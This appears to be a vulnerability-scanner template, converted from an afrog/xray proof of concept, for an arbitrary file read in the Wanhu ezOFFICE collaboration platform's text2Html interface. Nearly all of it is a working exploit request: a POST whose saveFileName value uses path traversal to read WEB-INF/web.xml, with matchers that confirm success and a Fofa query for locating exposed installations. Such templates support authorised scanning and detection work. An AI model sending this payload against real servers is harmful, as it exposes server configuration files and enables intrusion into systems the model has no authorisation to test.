# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - web-app xmlns=
        condition: and
      - type: word
        part: header
        words:
          - text/html
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/defaultroot/convertFile/text2Html.controller'
id: wanhu-ezoffice-text2html-fileread
info:
  author: zan8in
  description: |-
    万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞。
    Fofa: app="万户网络-ezOFFICE"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 万户协同办公平台ezoffice text2Html接口任意文件读取
  severity: high
  tags: wanhu,ezoffice,text2html,fileread,argus-import
